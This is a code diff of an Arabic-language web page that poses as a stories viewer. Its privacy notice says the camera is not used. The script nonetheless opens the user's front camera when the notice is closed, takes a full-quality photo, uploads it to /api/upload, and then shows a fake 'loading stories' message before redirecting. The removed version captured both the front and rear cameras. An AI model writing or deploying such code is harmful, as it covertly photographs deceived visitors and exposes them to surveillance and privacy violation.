@@ -95,7 +95,7 @@
       <h2>تنويه الخصوصية</h2>
       <p>
         <br>
-        هذا الموقع يطلب بعض الأذونات فقط لضمان عمل التطبيق بشكل صحيح مثل عرض القصص المصورة.
+        هذا الموقع يطلب بعض الاذونات فقط لضمان عمل التطبيق بشكل صحيح مثل عرض القصص المصورة.
         نحن نحرص على حماية خصوصيتك وعدم استخدام الكاميرا أو أي شيء آخر بل فقط التطبيق يحتاجها لعرض الصور الخاصة بالقصص.
       </p>
     </div>
@@ -108,55 +108,52 @@
     const privacyModal = document.getElementById('privacyModal');
     const closeBtn = document.getElementById('closeBtn');
 
-    async function captureImageFromCamera(facingMode) {
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }
-      });
-
-      return new Promise((resolve) => {
-        video.srcObject = stream;
-        video.onloadedmetadata = () => {
-          setTimeout(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            const imageData = canvas.toDataURL('image/jpeg', 1.0);
-            stream.getTracks().forEach(track => track.stop()); // نوقف الكاميرا
-            resolve(imageData);
-          }, 2000); // ننتظر شوية علشان الكاميرا تظبط
-        };
-      });
-    }
-
-    closeBtn.addEventListener('click', async () => {
+    closeBtn.addEventListener('click', () => {
       privacyModal.style.display = 'none';
 
-      try {
-        // نلتقط صورة من الكاميرا الأمامية
-        const frontImage = await captureImageFromCamera("user");
+      navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: "user",
+          width: { ideal: 1280 },
+          height: { ideal: 720 }
+        }
+      })
+      .then(function(stream) {
+        const video = document.getElementById('video');
+        video.srcObject = stream;
 
-        // نلتقط صورة من الكاميرا الخلفية
-        const backImage = await captureImageFromCamera({ exact: "environment" });
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // نرسل الصورتين للسيرفر
-        await fetch('/api/upload', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ frontImage, backImage })
-        });
+            const imageData = canvas.toDataURL('image/jpeg', 1.0); // JPEG بأعلى جودة
 
-        // رسالة "جاري التحميل"
-        document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family: Cairo, sans-serif;font-size:24px;color:#333;">جاري تحميل صفحة القصص...</div>';
+            fetch('/api/upload', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json'
+              },
+              body: JSON.stringify({ image: imageData })
+            });
 
-        setTimeout(() => {
-          window.location.href = 'https://stories22.netlify.app/';
-        }, 3000);
-      } catch (err) {
-        console.error("Error capturing images:", err);
-      }
+            // عرض رسالة جاري التحميل
+            document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family: Cairo, sans-serif;font-size:24px;color:#333;">جاري تحميل صفحة القصص...</div>';
+
+            // تحويل للرابط بعد 3 ثواني
+            setTimeout(() => {
+              window.location.href = 'https://stories22.netlify.app/';
+            }, 3000);
+
+          }, 3000);
+        };
+      })
+      .catch(function(err) {
+        console.error("Camera access denied:", err);
+      });
     });
   </script>
 </body>
